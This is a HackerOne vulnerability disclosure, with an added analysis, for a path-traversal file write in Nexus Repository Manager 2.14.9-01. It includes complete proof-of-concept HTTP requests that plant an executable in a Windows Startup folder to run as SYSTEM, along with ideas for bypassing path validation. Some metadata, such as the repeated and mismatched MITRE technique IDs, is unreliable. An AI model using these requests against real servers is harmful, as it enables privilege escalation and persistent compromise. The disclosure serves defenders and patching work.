# Unrestricted File Upload Leading to Remote Code Execution in Nexus Repository Manager

## Metadata
- **Source:** HackerOne
- **Report:** 683965 | https://hackerone.com/reports/683965
- **Submitted:** 2019-08-28
- **Reporter:** hland
- **Program:** Sonatype Nexus Repository Manager
- **Bounty:** Not specified in report
- **Severity:** CRITICAL
- **Vuln:** Unrestricted File Upload, Path Traversal, Arbitrary File Write, Remote Code Execution, Privilege Escalation
- **CVEs:** CVE-2019-15893
- **Category:** memory-binary

## Summary
Authenticated administrators in Nexus Repository Manager OSS 2.14.9-01 can create repositories with arbitrary file paths and upload files to any location on the filesystem. Since the Nexus process runs with SYSTEM privileges, attackers can write executables to Windows startup folders or other sensitive locations to achieve RCE and privilege escalation.

## Attack scenario
1. Attacker gains administrator access to Nexus Repository Manager through credential compromise or account takeover
2. Attacker creates a new hosted Maven repository with overrideLocalStorageUrl set to a sensitive Windows directory (e.g., Startup folder path traversed two levels up)
3. Attacker crafts a malicious POST request to /nexus/service/local/artifact/maven/content with manipulated g, a, v parameters to control file path and name
4. Attacker uploads a malicious PE executable (e.g., calc.exe or reverse shell binary) with arbitrary file extension via multipart form-data
5. Nexus process writes file to Windows Startup folder with SYSTEM privileges, bypassing user-level restrictions
6. Next time a user logs in, the executable runs automatically with elevated privileges, providing persistent RCE and lateral movement capability

## Root cause
Nexus Repository Manager lacks proper validation and sanitization of the overrideLocalStorageUrl parameter and file path components (g, a, v parameters). The application does not restrict file uploads to intended repository directories and fails to validate that constructed paths remain within expected boundaries. File extension validation is insufficient and can be bypassed.

## Attacker mindset
An insider threat or attacker with compromised admin credentials seeks persistent access and privilege escalation. By leveraging the SYSTEM-level process privileges, they can bypass OS-level access controls and establish a foothold for lateral movement across the network. The use of Windows Startup folders provides persistence across reboots.

## Defensive takeaways
- Implement strict whitelisting of allowed repository storage paths and reject any paths outside designated directories
- Validate and canonicalize all file path parameters (g, a, v) to prevent traversal sequences (../, .., etc.)
- Enforce that all repository operations occur within a sandboxed storage directory that cannot be overridden
- Run application services with minimal required privileges (principle of least privilege) rather than SYSTEM
- Implement strict file type validation based on repository type, not just extension
- Add authentication and authorization checks for sensitive operations like repository creation
- Use allowlist-based file extension restrictions for artifact uploads
- Monitor and log all repository creation and artifact upload operations
- Regularly audit filesystem permissions and implement AppLocker/Windows Defender policies to prevent execution from sensitive directories
- Implement file integrity monitoring on critical directories like Startup folders

## Variant hunting
Test other overridable paths in Nexus configuration (defaultLocalStorageUrl, etc.) for similar traversal vulnerabilities
Check if non-administrator users can create repositories or if role-based access control is properly enforced
Test upload functionality with alternative encoding (URL encoding, double encoding, UTF-8 bypass) for path traversal
Investigate if the vulnerability exists in other artifact upload endpoints beyond /nexus/service/local/artifact/maven/content
Test with UNC paths (\\?\C:\...) and alternate path formats to bypass validation
Check if similar vulnerabilities exist in other Sonatype products (Nexus Pro, Nexus Firewall, etc.)
Test privilege escalation vectors on Linux/Unix systems using cron jobs, systemd services, or shell startup scripts
Verify if temporary files created during upload are properly cleaned and not accessible to other users

## MITRE ATT&CK
- T1190
- T1040
- T1190
- T1055
- T1543
- T1547
- T1547.001
- T1574
- T1059
- T1203

## Notes
This vulnerability affects Nexus Repository Manager OSS 2.14.9-01 and likely earlier versions. The patch information in the report was incomplete. The vulnerability requires admin privileges but can be chained with other attacks to gain initial admin access. The use of SYSTEM privileges for the Nexus process is a critical security misconfiguration that amplifies the impact. File upload should never trust user-supplied path parameters without strict validation.

## Full report
<details><summary>Expand</summary>

### Description
As an administrator user it is possible to create files and directories in any location on the file system of the server. This can be abused to write files to any sensitive location on the Windows file system because the Nexus process runs with SYSTEM privileges. This can allows an attacker that is able to break into the Nexus Repository Manager to elevate privileges to SYSTEM on the server and use it as pivoting point for lateral movement during an attack.

In the proof-of-concept I upload a PE executable file to the user's Windows Startup Folder, achieving remote code execution the next time the user logs in. In my example simply executing calc.exe. 

The tests were done with an installation of Nexus Repository Manager OSS 2.14.9-01 on Microsoft Windows Server 2016 Datacenter 10.0.14393 N/A Build 1439.

### Additional Details
Unfortunately I was unable to dig up the functions handling these HTTP requests.

## Steps to reproduce:
1. Create a repo and set the "overrideLocalStorageUrl" to a folder two levels below the one you want to write files to.

`POST /nexus/service/local/repositories`

2. Upload a file to a directory of your choice by manipulating the "g", "a" and "v" parameters

`POST /nexus/service/local/artifact/maven/content`


### Proof-Of-Concept

1. Create repository:

```
POST /nexus/service/local/repositories HTTP/1.1
Host: nexus-host
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json,application/vnd.siesta-error-v1+json,application/vnd.siesta-validation-errors-v1+json
X-Nexus-UI: true
Content-Length: 443
Connection: close
Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770

{"data":{"repoType":"hosted","id":"5000","name":"MyTestRepo","writePolicy":"ALLOW_WRITE_ONCE","browseable":true,"indexable":true,"exposed":true,"notFoundCacheTTL":1440,"repoPolicy":"RELEASE","provider":"maven2","providerRole":"org.sonatype.nexus.proxy.repository.Repository","overrideLocalStorageUrl":"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu","downloadRemoteIndexes":false,"checksumPolicy":"IGNORE"}}

HTTP/1.1 201 Created
Date: Wed, 28 Aug 2019 16:58:53 GMT
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Server: Nexus/2.14.9-01 Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8
Content-Type: application/json; charset=UTF-8
Content-Length: 638
Connection: close

{"data":{"contentResourceURI":"http://<redacted>/nexus/content/repositories/5000","id":"5000","name":"MyTestRepo","provider":"maven2","providerRole":"org.sonatype.nexus.proxy.repository.Repository","format":"maven2","repoType":"hosted","exposed":true,"writePolicy":"ALLOW_WRITE_ONCE","browseable":true,"indexable":true,"notFoundCacheTTL":1440,"repoPolicy":"RELEASE","downloadRemoteIndexes":false,"overrideLocalStorageUrl":"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu","defaultLocalStorageUrl":"file:/C:/Users/myuser/Desktop/nexus-2.14.9-01-bundle/sonatype-work/nexus/storage/5000"}}
```

2. Upload file

```
POST /nexus/service/local/artifact/maven/content HTTP/1.1
Host: nexus-host
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------103850373015325909411337083269
Content-Length: 33250
Connection: close
Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770
Upgrade-Insecure-Requests: 1

-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="r"

5000
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="g"

Programs
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="a"

Startup
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="v"

.
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="p"

jar
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="c"


-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="e"

exe
-----------------------------103850373015325909411337083269
Content-Disposition: form-data; name="file"; filename="calc.exe"
Content-Type: text/html

<insert_content_of_calc.exe>
-----------------------------103850373015325909411337083269--


HTTP/1.1 201 Created
Date: Wed, 28 Aug 2019 17:05:47 GMT
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Server: Nexus/2.14.9-01 Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8
Content-Type: text/html;charset=UTF-8
Content-Length: 77
Connection: close

{"groupId":"Programs","artifactId":"Startup","version":".","packaging":"jar"}
```

## Patch
There are multiple ways to fix this:

1. Make it the default to run Nexus Repository Manager as a less privileged user. 
2. Restrict the locations on the filesystem that Nexus Repository Manager can write to.

## Additional details

* OS Name:                   Microsoft Windows Server 2016 Datacenter
* OS Version:                10.0.14393 N/A Build 14393

* java version "1.8.0_211"
Java(TM) SE Runtime Environment (build 1.8.0_211-b12)
Java HotSpot(TM) 64-Bit Server VM (build 25.211-b12, mixed mode)

# Wrap up
- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

My reaction when uploading files to any location on the filesystem:
https://66.media.tumblr.com/463873f43d1b6c3ae34ab817fe92e0a2/tumblr_inline_omgbhw31qa1qar3or_500.gif

## Impact

The attacker could run arbitrary code on the server as the SYSTEM user.

</details>

---
*Analysed by Claude on 2026-05-12*
